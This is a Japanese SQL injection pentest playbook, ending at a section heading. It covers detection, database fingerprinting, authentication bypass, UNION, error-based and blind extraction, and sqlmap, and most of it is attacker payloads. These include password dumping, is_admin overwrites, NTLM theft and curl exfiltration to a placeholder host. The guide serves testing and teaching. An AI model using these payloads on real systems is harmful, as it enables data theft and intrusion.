# SQL インジェクション (SQLi)

> **スコープ**: Web アプリの入力（URL パラメータ / フォーム / Cookie / ヘッダー / JSON / XML）経由で SQL 文字列に混入させる**注入技法**に集中。検出・コンテキスト別注入（WHERE / ORDER BY / INSERT / UPDATE / LIMIT）・UNION 攻撃・error-based / boolean / time-based blind 抽出・OAST (Out-of-band)・second-order・sqlmap 自動化までを 1 ファイルで扱う。**DB 判別後のエンジン固有 RCE / ファイル I/O / ハッシュ取得は別ファイルへ委譲**: MSSQL → `../MSSQL_Exploitation.md`（`xp_cmdshell` / Linked Server / NTLM steal）/ MySQL → `../MySQL_Exploitation.md`（FILE 権限・UDF・`INTO OUTFILE`）/ PostgreSQL → `../PostgreSQL_Exploitation.md`（`COPY FROM PROGRAM` / PL/PerlU / `lo_export`）。

## 着火条件

以下のいずれかに該当する場合:

- ログインフォーム・URL パラメータ（`?id=1` / `?search=foo`）・JSON / XML body にユーザー制御可能な値があり、それが DB クエリに使われている疑い
- 入力に `'` を入れるとエラーレスポンスが出る・レスポンスサイズや内容が変化する・処理時間が変わる
- エラーメッセージに `SQL` / `ORA-` / `MySQL` / `PostgreSQL` / `syntax error` 等の DB 由来文字列が含まれる
- WAF や Cookie ベース session 管理があり sqlmap が空振りするため、手動で組み立てる必要がある

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `curl` / `sqlmap`（自動検出・抽出ツール、ペネトレ用 Linux ディストリ標準搭載、インターネットアクセス不要） / Burp Suite（プロキシ・Repeater・Intruder、Community 版で十分・無償） / Burp Collaborator（Pro 同梱の OAST サーバー）or `interactsh-client`（ProjectDiscovery 製の OSS OAST クライアント、別途インストール `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`）
- 外部リソース依存: OAST サーバー（Burp Collaborator / Interactsh の public instance）へのアウトバウンド DNS / HTTP 到達が §9 OAST で必要。閉域環境では攻撃者管理 DNS サーバを別途立てる

## 先に確認すること

- **DB バックエンドの推定**: `'` 注入時のエラー文字列・version 関数の挙動・コメント記号の差で MSSQL / MySQL / PostgreSQL / Oracle / SQLite を判別する。§2 cheat sheet を参照
- **stacked queries（複文）の可否**: バックエンドと DB ドライバの組合せで決まる。stacked queries が通る DB（MSSQL / PostgreSQL / SQLite の一部 binding）なら **`;` 区切りで任意の `INSERT` / `UPDATE` / `xp_cmdshell` / `COPY ... FROM PROGRAM` を流し込める**。MySQL / Oracle は default で複文不可
- **コメント記号の挙動**: `--`（末尾スペース必須）・`#`（MySQL 限定）・`/* */`。URL 中では `--` が `--+` / `-- -` / `--%20` のエスケープを試す
- **HTTPOnly / WAF / レート制限**: 検出前に観点・着眼点で確認（`../../01_Reconnaissance/Web_Response_Triage.md`）。WAF があると `'` 単独で 403 が返るため、`tamper` 系の難読化が必要
- **DoS 保護**: Time-based blind は 1 文字あたり数秒〜数十秒かかるため、接続元 IP 自動 BAN がある環境では並列度を下げる必要あり

**攻撃者の思考トレース:** SQLi の調査は **「注入が成立するか」→「どんな出力チャネルが得られるか」→「どこまで深掘りするか」** の 3 段。最初の `'` で 500 が出れば error-based / UNION が射程に入る。エラーが消されている場合は `1=1` vs `1=2` の差分応答（boolean）か、それも無ければ最終手段の time-based。すべて空振りでも `LOAD_FILE('\\\\[OOB]\\x')` や `xp_dirtree '\\\\[OOB]\\x'` で OAST 経路が残っている。**DB を判別してから注入文を組み立てる**のが効率的（cheat sheet を引いて comment / sleep / version 関数を選ぶ）。stacked queries が通る場合は **エンジン固有 RCE が一気に射程に入る**ため、ここで DB 固有ファイルへ転送して詳細を引く。

---

## 1. 検出（manual probing）

**ペイロード:**

```http
# [Attacker] (a) Single quote: 構文崩壊で error / 挙動変化を観察
GET /page?id=1' HTTP/1.1

# [Attacker] (b) Numeric context boolean: 数値カラムの WHERE への注入
GET /page?id=1 AND 1=1 HTTP/1.1    # → true 応答（通常表示）
GET /page?id=1 AND 1=2 HTTP/1.1    # → false 応答（空 / 別ページ）

# [Attacker] (c) String context boolean: 文字列カラムの WHERE への注入
GET /search?q=foo' OR '1'='1 HTTP/1.1
GET /search?q=foo' OR '1'='2 HTTP/1.1

# [Attacker] (d) Time-based confirm: error も差分も無いとき
GET /page?id=1' AND SLEEP(3)-- - HTTP/1.1                    # MySQL
GET /page?id=1; WAITFOR DELAY '0:0:3'-- HTTP/1.1             # MSSQL
GET /page?id=1' AND pg_sleep(3)-- HTTP/1.1                   # PostgreSQL

# [Attacker] (e) Comment-induced behavior change（コメント記号有効性確認）
GET /page?id=1-- - HTTP/1.1            # 正常応答なら -- が末尾コメント化
GET /page?id=1/*foo*/ HTTP/1.1         # /* */ コメント有効性
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `500 Internal Server Error` + SQL 由来文字列 (`SQL syntax` / `ORA-` / `pg_query`) | error-based 経路射程・DB 種別もここで判別 | §2 cheat sheet で DB 確定 → §5 UNION / §6 Error-based |
| `1=1` と `1=2` でレスポンスが異なる（content size / HTML 差分） | Boolean blind 経路射程 | §7 Boolean blind |
| エラーも差分も無いが `SLEEP(3)` で 3 秒以上遅延 | Time-based blind 経路射程 | §8 Time-based blind |
| すべて同じ応答（差分・遅延・エラーなし） | 注入なし / 完全 blind | §9 OAST で out-of-band 確認 |
| `'` で 403 / WAF page | WAF / IDS が `'` を block | §11 sqlmap `--tamper` / 手動でエンコード（`%2527` 二重 URL encode / `0x27` hex / `CHAR(39)`） |
| `1' --` で 200 復帰、`1' /*` で 500 | `--` コメント記号成立、`/* */` は受け付けない | コメント記号は `--`（末尾スペース必要） |
| number context で `1+1` を入れると `2` 相当に扱われる | 数値演算が server-side で評価されている | numeric SQLi 強いシグナル・`OR 1=1` を直接使える |
| エラーに `near 'syntax'` のような generic 文字列 | error 抑制設定・本文に詳細が出ない | §6 Error-based で `CAST` / `EXTRACTVALUE` 経由の subquery 結果エラー誘発を試す |

> **注意:** 検出時の `'` は **最も粗いシグナル**だが、現代の framework（Spring / Rails / Django）は `prepared statement` を多用しているため `'` で error が出ない箇所が大半。`'` で何も起きなくても **boolean / time-based を続けて試す**こと（dynamic query 部分が残っている可能性）。コメント記号 `--` は **末尾にスペースが必要**（多くの DB の仕様）で、URL 中では `--+` (`+` がスペース) / `-- -` (空白 + 何か) / `--%20` のいずれかを試す。

---

## 2. DB 横断 cheat sheet（comment / version / sleep / substring / 連結 / OOB）

**コマンド:** （ペイロード断片の DB 横断比較。注入時にどの DB かを判別してから組み立てる）

| 機能 | MySQL / MariaDB | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| 末尾コメント | `-- ` / `#` | `-- ` / `/* */` | `-- ` / `/* */` | `-- ` | `-- ` |
| インラインコメント | `/* */` / `/*! */`（MySQL 限定の version 条件付き） | `/* */` | `/* */` | `/* */` | `/* */` |
| 文字列連結 | `CONCAT(a, b, c)`（区切り無し）/ space 不可 | `a + b`（int / varchar mix 注意） | `a \|\| b` / `CONCAT(a, b)` | `a \|\| b` / `CONCAT(a, b)` | `a \|\| b` |
| version 取得 | `SELECT @@version` / `SELECT version()` | `SELECT @@version` | `SELECT version()` | `SELECT banner FROM v$version` | `SELECT sqlite_version()` |
| 現ユーザー | `USER()` / `CURRENT_USER()` | `SUSER_NAME()` / `SYSTEM_USER` | `current_user` | `USER`（式） | （ユーザー概念なし。OS ファイル権限に依存） |
| 現 DB | `DATABASE()` | `DB_NAME()` | `current_database()` | `SELECT ora_database_name FROM dual` / `SELECT name FROM v$database`（Oracle は概念的にスキーマ単位だが値自体は取得可） | `PRAGMA database_list`（アタッチ済 DB のパス含む） |
| 全テーブル列挙 | `information_schema.tables` | `INFORMATION_SCHEMA.TABLES` / `sys.tables` | `information_schema.tables` / `pg_tables` | `all_tables` / `user_tables` | `sqlite_master` |
| 全カラム列挙 | `information_schema.columns` | `INFORMATION_SCHEMA.COLUMNS` / `sys.columns` | `information_schema.columns` | `all_tab_columns` | `pragma_table_info('[T]')` |
| 文字列切出 | `SUBSTRING(s, n, len)` / `MID(s, n, len)` | `SUBSTRING(s, n, len)` | `SUBSTRING(s FROM n FOR len)` / `SUBSTR(s, n, len)` | `SUBSTR(s, n, len)` | `SUBSTR(s, n, len)` |
| ASCII 値 | `ASCII(c)` / `ORD(c)` | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `UNICODE(c)` |
| 16進数文字列 | `0xDEADBEEF`（クォート不要） | `0xDEADBEEF` | `decode('DEADBEEF', 'hex')` | `UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('...'))` | `x'DEADBEEF'` |
| 時間遅延 | `SLEEP(N)` / `BENCHMARK(N, MD5('a'))`（heavy CPU 代替） | `WAITFOR DELAY '0:0:N'` | `pg_sleep(N)` | `dbms_pipe.receive_message(('a'), N)` | （native 関数なし・heavy query で代替） |
| 条件付き遅延 | `IF(cond, SLEEP(N), 0)` | `IF (cond) WAITFOR DELAY '...'` | `CASE WHEN cond THEN pg_sleep(N) ELSE pg_sleep(0) END` | 同上 CASE | (n/a) |
| stacked queries 既定 | ❌ NG（多くのクライアント） | ✅ OK | ✅ OK | ❌ NG | △ binding 依存 |
| OOB（DNS / HTTP exfil） | `LOAD_FILE('\\\\[OOB]\\x')`（**Windows MySQL 限定**・SMB 経由 DNS 解決） | `xp_dirtree '\\\\[OOB]\\x'`（NTLM hash steal も同時に発生・`../MSSQL_Exploitation.md`） | `COPY (SELECT ...) TO PROGRAM 'curl http://[OOB]/?d=...'`（SUPERUSER 必要・`../PostgreSQL_Exploitation.md` §8）/ `dblink` extension | `UTL_HTTP.REQUEST('http://[OOB]/...' \|\| (SELECT ...))` / `DBMS_LDAP.INIT(...)` / `XMLType` 経由 SYSTEM XXE | （標準では OOB 経路無し） |
| エラー誘発（error-based 抽出） | `EXTRACTVALUE(1, CONCAT(0x7e, ([SUBQ])))` / `UPDATEXML(1, CONCAT(0x7e, ([SUBQ])), 1)` | `CONVERT(int, ([SUBQ]))` (型不一致) | `CAST(([SUBQ]) AS int)` (型不一致) | `XMLType('<x>' \|\| ([SUBQ]) \|\| '</x>')` (XML parse err) | (限定的) |

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `'#a` を注入して error / 正常応答が変わる | `#` コメント有効 → MySQL 強い示唆 | MySQL 経路で組立（`SLEEP` / `INTO OUTFILE` / `UDF`）|
| `WAITFOR DELAY '0:0:3'` で遅延発生 | MSSQL 確定 | `../MSSQL_Exploitation.md` の `xp_cmdshell` / Linked Server / NTLM steal |
| `pg_sleep(3)` で遅延発生 | PostgreSQL 確定 | `../PostgreSQL_Exploitation.md` の COPY FROM PROGRAM / PL/PerlU / lo_export |
| `UTL_HTTP.REQUEST` で error or OAST 着信 | Oracle 確定 | Oracle 固有 PL/SQL injection / UTL_FILE / `DBMS_SCHEDULER` 経路（kedalab に専用ファイル未作成・`../../05_Tools_Reference/Searchsploit.md` で版数 CVE 探索）|
| `sqlite_version()` が返る | SQLite 確定 | ファイルベース DB のため OS RCE 経路は限定的（`load_extension()` で .so / .dll ロード可能だが SQLite 設定依存）|
| stacked queries が通る (`; SELECT 1; --` で複文成功) | エンジン固有 RCE が射程 | DB 確定後に該当 `*_Exploitation.md` の RCE 章へ |

> **注意:** **DB 判別は注入を組み立てる前提条件**。判別前に paypath を投げると不発で時間を浪費する。version 関数の差・comment 記号の差・sleep 関数の差の **3 シグナル**で粗判別、その後 `SELECT @@version` / `SELECT version()` で確定する。Oracle / SQLite はこのファイルでは concise 扱いで、深掘りは別途検討（kedalab に専用ファイルは未作成、頻出度が低いため）。

---

## 3. 認証バイパス（WHERE 句注入の最重要パターン）

**ペイロード:**

```sql
-- 典型 1: 末尾コメントでパスワードチェックを無効化
ユーザー名: admin' --
パスワード: anything
-- → SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'

-- 典型 2: 常に真の条件で全行取得 → 最初の行（多くは admin）でログイン成立
ユーザー名: ' OR '1'='1' --
パスワード: anything

-- 典型 3: 数値 ID context
?user_id=1 OR 1=1 --

-- 典型 4: existing user を狙う + パスワード比較迂回
ユーザー名: admin' AND 1=1 --
パスワード: anything

-- 典型 5: UNION で偽の認証情報を投影（DB に該当ユーザーがいなくてもログイン可）
ユーザー名: nonexistent' UNION SELECT 1, 'admin', 'fake_hash' --
パスワード: [fake_hash に対応する平文 / もしくは平文比較のアプリ]

-- 典型 6: hash 比較迂回（アプリが hash(input) == DB.hash 形式の場合）
ユーザー名: admin' UNION SELECT 1, 'admin', MD5('anything') --
パスワード: anything

-- 典型 7: コメント記号変種（コメントが filter されているとき）
ユーザー名: admin'/*
パスワード: */OR/**/'1'='1
-- 一部の WAF を抜ける書き方
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 認証バイパス成功（ダッシュボード / セッション cookie 取得） | アプリが query 結果の単純存在で認証判定 | 取得セッションで他機能を試行（CSRF / XSS / IDOR） |
| 典型 1〜3 でログイン画面に戻る | コメント記号が無効化 / WHERE 句以外の認証ロジックあり | 典型 7 のコメント変種・WAF tamper |
| 典型 5 で `column count mismatch` エラー | UNION のカラム数が違う | §5 UNION 攻撃でカラム数特定後に再構築 |
| typical-1 で `Hello, admin` が出るが機能が動かない | 認証は通ったが session のロール check が別 | 認証 bypass はできているが authz は別経路 / role 抽出（§5 UNION で別テーブル参照） |
| 全パターンで `403` / WAF page | WAF 介入 | §11 sqlmap `--tamper` / 手動エンコード |

> **注意:** 認証バイパスは「**アプリが SQL 結果の存在チェックで認証判定している場合のみ**」成立する。現代の framework は session/role を別テーブルで管理しているため、SQL 結果が空でも login fail せず、別の boolean で fail を判定する。空でも login 通ることが多い（fallback の管理者 session が降りる）。試した時点でアプリの認証ロジックがどう書かれているかが分かるシグナル。**本番では認証バイパスは 1 試行で十分**（複数試行はアカウントロックの認証ログを汚す）。

---

## 4. コンテキスト別注入（ORDER BY / INSERT / UPDATE / LIMIT）

WHERE 句以外の注入箇所では `OR 1=1` / `UNION` がそのまま使えない場面が多い。コンテキスト別の組み立てが必要。

**コマンド:**

```sql
-- (A) ORDER BY 句注入: ORDER BY は列番号 or 列名のみを受け付け、サブクエリは直接書けない
?sort=1 ASC                                                                  -- 通常
?sort=(CASE WHEN (SELECT 1=1) THEN 1 ELSE 2 END)                             -- 条件で並び順切替 → blind 抽出
?sort=1, (SELECT CASE WHEN (cond) THEN SLEEP(3) ELSE 0 END)                  -- MySQL time-based
?sort=1, IF(1=1, SLEEP(3), 0)                                                -- MySQL
?sort=1; WAITFOR DELAY '0:0:3' --                                            -- MSSQL stacked

-- (B) LIMIT 句注入 (MySQL / PostgreSQL): カラム数を増やせないため UNION 不可
?page=1 PROCEDURE ANALYSE(EXTRACTVALUE(0, CONCAT(0x7e, version())), 0)       -- MySQL 5.x error-based
?page=1, (SELECT IF(1=1, SLEEP(3), 0))                                       -- MySQL time-based

-- (C) INSERT INTO ... VALUES (...) への注入: '入力' から SQL 文字列を抜け出す
-- 元クエリ: INSERT INTO comments (user_id, body) VALUES (1, '[INPUT]')
INPUT: hello'); SELECT pg_sleep(3); --                                       -- PostgreSQL stacked
INPUT: hello' \|\| (SELECT version()) \|\| '                                   -- PostgreSQL 文字列連結で見える exfil
INPUT: hello', (SELECT password FROM users LIMIT 1));--                       -- カラム偽装で他データ詰込（ON DUPLICATE KEY が無ければ）

-- (D) UPDATE SET col = '入力' WHERE id = N への注入: SET 句改変で全カラム上書きリスク
-- 元クエリ: UPDATE users SET nickname = '[INPUT]' WHERE id = 1
INPUT: foo', is_admin=1 --                                                   -- 認可昇格（is_admin を 1 に上書き）
INPUT: foo', password = (SELECT password FROM users WHERE username='admin') -- -- パスワード奪取（自分の pw が admin のと同じになる経路）

-- (E) JSON / XML パラメータへの注入: parser を抜けてから SQL 文字列に到達
-- POST body: {"id": "1' OR 1=1 -- "}                                        -- JSON 経由
-- POST body: <user><id>1' OR 1=1 -- </id></user>                            -- XML 経由
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ORDER BY で `(CASE WHEN ...)` が刺さって並び順が変わる | ORDER BY blind 経路 | §7 Boolean blind を ORDER BY 経由で実施 |
| LIMIT 句で `SLEEP(3)` が効く | MySQL LIMIT context で time-based 可 | §8 Time-based 抽出を LIMIT 経由で |
| INSERT で stacked queries が通って `pg_sleep(3)` が効く | PostgreSQL / MSSQL の INSERT 注入経路成立 | エンジン固有 RCE 経路に直行（`../PostgreSQL_Exploitation.md` / `../MSSQL_Exploitation.md`） |
| UPDATE SET 経由で他カラム書込成功 | 認可昇格 / 任意ユーザーパスワード上書き | **業務影響大**（パスワードリセットによる業務影響）・本番では事前合意必須 |
| JSON / XML で `'` を escape されている | parser 層で escape されてから SQL 層に届く | parser を抜ける encoding（`%2527` / Unicode `'`）を試す |

> **注意:** **ORDER BY 句注入は UNION が使えない**ため、boolean / time-based 経由でしか抽出できない。INSERT / UPDATE は **stacked queries が通れば一発で RCE 級**、通らなくても **他カラムへの書込で認可昇格・パスワード奪取に直結**するため成功した時点で業務影響が大きい（事前合意必須）。JSON / XML 経由は parser が string escape を尊重するため `'` が `\'` に置換されることが多い。Unicode 正規化を絡めた double encoding が抜けることがある。

---

## 5. UNION 攻撃

**手順（PortSwigger / WSTG-INPV-05 標準フロー）:**

1. **カラム数特定**: `ORDER BY N` を 1 から増やし error が出る一歩手前まで / もしくは `UNION SELECT NULL, NULL, ...` で NULL の数を増やす
2. **カラム型特定**: 各カラムに文字列を入れて成功する位置を見つける（`UNION SELECT 'a', NULL, NULL` → 1 列目が string OK）
3. **抽出**: 成功カラムから `username` / `password` 等を select
4. **information_schema 列挙**: 全 DB / 全テーブル / 全カラムを横断列挙

**コマンド:**

```sql
-- [Attacker] (1) カラム数特定（ORDER BY 経路）
?id=1 ORDER BY 1 --       -- 通常応答
?id=1 ORDER BY 2 --       -- 通常応答
?id=1 ORDER BY 10 --      -- 「Unknown column '10'」等の error → カラム数は 9 以下
-- 二分探索で確定

-- [Attacker] (2) カラム数特定（UNION SELECT NULL 経路・ORDER BY が DBA で禁止されている場合）
?id=1 UNION SELECT NULL --
?id=1 UNION SELECT NULL, NULL --
?id=1 UNION SELECT NULL, NULL, NULL --
-- error が消えた個数がカラム数

-- [Attacker] (3) カラム型特定（string OK の列を探す）
?id=1 UNION SELECT 'a', NULL, NULL --       -- 1 列目 string OK か
?id=1 UNION SELECT NULL, 'a', NULL --       -- 2 列目 string OK か
-- MySQL は混合型を許容するが MSSQL / PostgreSQL は型不一致でエラーになるため、各列を 1 つずつ確認

-- [Attacker] (4) DB version + 現ユーザー抽出（最初に取る基本情報）
?id=1 UNION SELECT @@version, USER(), DATABASE() --                          -- MySQL
?id=1 UNION SELECT version(), current_user, current_database() --            -- PostgreSQL
?id=1 UNION SELECT @@version, SUSER_NAME(), DB_NAME() --                     -- MSSQL

-- [Attacker] (5) 全テーブル列挙
?id=1 UNION SELECT table_schema, table_name, NULL FROM information_schema.tables --
?id=1 UNION SELECT NULL, name, NULL FROM sys.tables --                       -- MSSQL 別経路
?id=1 UNION SELECT NULL, tbl_name, NULL FROM sqlite_master WHERE type='table' --  -- SQLite

-- [Attacker] (6) 特定テーブルのカラム列挙
?id=1 UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users' --

-- [Attacker] (7) 単一カラムにパスワード等を詰める（連結）
?id=1 UNION SELECT CONCAT(username, ':', password), NULL, NULL FROM users --        -- MySQL
?id=1 UNION SELECT username \|\| ':' \|\| password, NULL, NULL FROM users --        -- PostgreSQL / Oracle / SQLite
?id=1 UNION SELECT username + ':' + password, NULL, NULL FROM users --              -- MSSQL（型一致時のみ）

-- [Attacker] (8) 複数行を 1 行に集約（カラム数が 1 つしか使えない場合）
?id=1 UNION SELECT GROUP_CONCAT(username, ':', password SEPARATOR '\n') FROM users -- -- MySQL
?id=1 UNION SELECT STRING_AGG(username \|\| ':' \|\| password, E'\n') FROM users --   -- PostgreSQL
?id=1 UNION SELECT STRING_AGG(username + ':' + password, char(10)) FROM users --     -- MSSQL 2017+
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `UNION SELECT NULL` でカラム数確定後、応答に注入値が見える | UNION 抽出経路成立 | §5(4)〜(8) で version / table / column / data 抽出 |
| `Unknown column 'N'` で error | カラム数判明 | カラム数特定確定 |
| `The used SELECT statements have a different number of columns` | カラム数不一致 | NULL を増減して合わせる |
| 型不一致 error (`Conversion failed when converting the varchar value 'a' to data type int`) | string OK 列の判定 | 該当列に NULL を入れて残りで再試行 |
| `information_schema.tables` から DB 横断のテーブル名取得 | DB 構造把握 | パスワード / cred カラム検索（§4 のクロス検索）|
| GROUP_CONCAT で全 user:hash 取得 | パスワード抽出完了 | `../../05_Tools_Reference/Hashcat.md` でクラック |
| MSSQL で型不一致 error が出てカラム名がエラーメッセージに出る | error-based 抽出経路にも転用可能 | §6 Error-based 抽出 |

> **注意:** UNION 攻撃は **DB エンジンで構文が変わる**（連結方法・コメント記号・GROUP_CONCAT 相当関数）。§2 cheat sheet で DB を確定してから組み立てる。**`information_schema` は MSSQL / MySQL / PostgreSQL に存在**するが Oracle / SQLite には別の経路（Oracle は `all_tables`、SQLite は `sqlite_master`）。MySQL の `GROUP_CONCAT` はデフォルトで 1024 文字制限があるため、大きなテーブルは `SET SESSION group_concat_max_len = 1000000` で拡張（stacked queries が通る場合のみ）または `LIMIT 1 OFFSET N` で 1 行ずつ。

---

## 6. Error-based 抽出

エラーメッセージに subquery 結果を流す経路。Error-based は **boolean / time-based より 1 リクエストあたりの抽出量が多い**（1 リクエストで version 文字列全体が取れる）ため、可能なら最優先。

**コマンド:**

```sql
-- [Attacker] MySQL: EXTRACTVALUE 経路（最も古典的）
?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --
-- error: XPATH syntax error: '~8.0.32'
-- → 0x7e (~) の後ろに subquery 結果が出る

-- [Attacker] MySQL: UPDATEXML 経路（EXTRACTVALUE と等価）
?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 1)), 1) --

-- [Attacker] MSSQL: 型不一致による convert error
?id=1 AND 1 = CONVERT(int, (SELECT @@version)) --
-- error: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019 ...' to data type int.

-- [Attacker] MSSQL: 別経路（subquery を WHERE に強引に評価させる）
?id=1 AND 1 = (SELECT TOP 1 name FROM sys.databases) --

-- [Attacker] PostgreSQL: cast error
?id=1 AND 1 = CAST((SELECT version()) AS int) --
-- error: invalid input syntax for integer: "PostgreSQL 13.4 on x86_64-pc-linux-gnu, ..."

-- [Attacker] PostgreSQL: division by zero with subquery
?id=1 AND 1/(SELECT (CASE WHEN (cond) THEN 0 ELSE 1 END)) = 1 --

-- [Attacker] Oracle: XMLType error
?id=1 AND 1 = (SELECT XMLType('<x>' \|\| (SELECT user FROM dual) \|\| '</x>') FROM dual) --
-- error: ORA-31011: XML parsing failed ... '<x>SYSTEM</x>'

-- [Attacker] Oracle: dbms_xdb_version
?id=1 AND 1 = CTXSYS.DRITHSX.SN(1, (SELECT user FROM dual)) --
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| エラー内に `~[subquery 結果]` (MySQL XPATH) | EXTRACTVALUE / UPDATEXML 成立 | 抽出対象を変えて反復（version → user → DB 名 → table 名 → password） |
| エラーに `'Microsoft SQL Server ...'` 等が出る | CONVERT 型不一致が出力経路 | 同様に subquery を順次変える |
| エラーが汎用 `500` のみで詳細が出ない | error 詳細が抑制された production 設定 | §7 Boolean blind / §8 Time-based blind |
| エラーは出るが subquery 結果が含まれない | DB 側で error 抑制 | 別の error 関数を試す（EXTRACTVALUE → UPDATEXML → CAST etc.）|
| エラー内に subquery が一部しか出ない（長さ制限） | EXTRACTVALUE の出力は 32 文字制限あり（MySQL） | `SUBSTRING` で先頭 32 文字ずつスライス抽出 |

> **注意:** Error-based は **エラーメッセージがレスポンスに含まれる前提**。production 環境では generic 500 page になっていることが大半で、その場合は使えない。MySQL の `EXTRACTVALUE` の error message は **約 32 文字制限**があるため、長い値は `SUBSTRING(subquery, 1, 32)` / `SUBSTRING(subquery, 33, 32)` で分割抽出。MSSQL は `nvarchar` → `int` 変換でほぼ全長出る。

---

## 7. Boolean blind 抽出（差分応答）

レスポンスに subquery 結果が出ない / error も出ないが、`AND 1=1` と `AND 1=2` で応答内容に差がある場合、1 リクエスト = 1 bit で抽出。

**コマンド:**

```sql
-- [Attacker] パスワード 1 文字目が 'a' か（ASCII 二分探索の片側）
?id=1 AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --

-- [Attacker] ASCII 二分探索（より効率的・1 文字 7 bit = 7 リクエスト）
?id=1 AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') > 96 --
-- true なら 97（'a'）以上 → 範囲を狭めて再試行

-- [Attacker] テーブル数判定
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()) > 5 --

-- [Attacker] 文字列長判定（version 文字列の長さ）
?id=1 AND LENGTH(@@version) > 10 --

-- [Attacker] sqlmap --technique=B で自動化
sqlmap -u "http://[TARGET]/page?id=1" --technique=B --batch
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `AND 1=1` で正常応答、`AND 1=2` で空 / 別レスポンス | Boolean blind 経路成立 | 二分探索で抽出（1 文字 = ASCII 7 bit = 7 リクエスト程度）|
| 全 case で同じ応答 | Boolean シグナルが消えている / DB 側で error 抑制 | §8 Time-based blind |
| 応答差が時々現れる / 一貫しない | session / cache / load balancer 由来の noise | 同一 cookie で連続試行・差分が安定するまで観察 |
| ASCII 比較が char encoding（UTF-8 multibyte）で失敗 | DB が utf8 / utf8mb4 で latin1 と挙動が異なる | `HEX()` 経由で 1 byte ずつ取る |
| sqlmap が非常に遅い | レート制限 / `--threads=1` 強制 | レート制限の閾値を観察して `--delay` を調整 |

> **注意:** Boolean blind は **1 リクエスト 1 bit**（ASCII 二分探索なら 1 文字 7 リクエスト）と効率が悪く、long string（パスワードハッシュ等）は数千リクエストになる。WAF / DoS 保護で接続元 IP を BAN されるリスクが高いため、本番では **対象を必須最小限に絞る**（version / table 数 / admin password の hash 程度）。char encoding がデフォルト latin1 でない環境では `ASCII()` 比較が壊れることがあるため、`HEX(SUBSTRING(...))` で 1 byte 単位の比較に切り替える。

---

## 8. Time-based blind 抽出

レスポンスに差分すら無いとき、**処理時間**でしか 1 bit 取れない。最低限の使用に留める。

**コマンド:**

```sql
-- [Attacker] 脆弱性の存在確認（3 秒遅延するか）
curl -s "http://[TARGET]/[ENDPOINT]?[VULN_PARAM]=1' AND SLEEP(3) -- -" \
  -o /dev/null -w "%{time_total}\n"
# 3 秒以上かかれば SQLi 成立

-- [Attacker] MySQL: 条件付き sleep
?id=1' AND IF((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a', SLEEP(3), 0) -- -

-- [Attacker] MSSQL: stacked queries 経路で WAITFOR DELAY
?id=1'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a') WAITFOR DELAY '0:0:3' --

-- [Attacker] PostgreSQL: CASE WHEN ... pg_sleep
?id=1' AND CASE WHEN (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' THEN pg_sleep(3) ELSE pg_sleep(0) END -- -

-- [Attacker] sqlmap --technique=T で自動化
sqlmap -u "http://[TARGET]/page?id=1" --technique=T --time-sec=5 --batch
```

**抽出時の優先順位（旧ブロック由来の経験則）:**

1. **ソルト**（`config` テーブルの `salt` カラム等）— 多くの Web アプリは `md5(salt + password)` 形式でハッシュを保存しており、salt なしでは hash クラックできない
2. **ユーザー名一覧**（admin / root / 1 番目のユーザー）
3. **メールアドレス**（社外連絡先・SSO の identifier 候補）
4. **パスワードハッシュ**（クラック対象）

抽出後の ソルト + MD5 ハッシュは Python の単純ループ（`hashlib.md5((salt + word).encode()).hexdigest()` を `rockyou.txt` の各行で計算）で確認可。詳細フォーマット例とアプリ × バージョン固有のペイロードは：

- **CMS Made Simple ≤ 2.2.9（CVE-2019-9053）** → `../../05_Tools_Reference/CVE_Notes.md`

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `SLEEP(3)` で実際に 3 秒以上遅延 | Time-based 経路成立 | 二分探索で 1 文字ずつ抽出（Boolean blind と同じロジック、応答時間を oracle に）|
| 遅延が観測されない | DB 関数が制限されている / WAF で `SLEEP` 単語ブロック | DB 別の代替関数（MySQL `BENCHMARK(10000000, MD5('a'))` / heavy query / nested subquery） |
| 遅延が常に発生する（条件無視） | クエリ全体が常に遅延関数を通る構造 | 条件式を意図と逆にして検証 |
| sqlmap が `--time-sec` を上げないと検出しない | サーバーの通常レスポンス時間が大きい | `--time-sec=10` 以上 / 統計判定の threshold 調整 |
| 抽出途中で接続切断（DoS 保護） | 連続リクエストで自動 BAN | `time.sleep(0.5)` を 1 リクエストごとに挿入 / 接続元 IP rotation |

> **注意:** **DoS 保護があるサイトではリクエスト間に遅延を入れる**（`time.sleep(0.5)` 程度）。連続リクエストで接続が切られると抽出が止まる。スリープ閾値（TIME 変数）は環境のレイテンシに合わせて調整する。レイテンシが 200ms 以上ある場合は `TIME=5` 程度に上げる。文字セット（dictionary）に不足がある場合は 1 文字も抽出されずに終わる。エラーなく空文字が返る場合は文字セットを確認。Python 2 系のエクスプロイトは `hashlib.md5(str(salt) + word)` でバイト/文字列の混在エラーが出る（Python 3 では `.encode()` が必要）。

---

## 9. Out-of-band (OAST) exfil

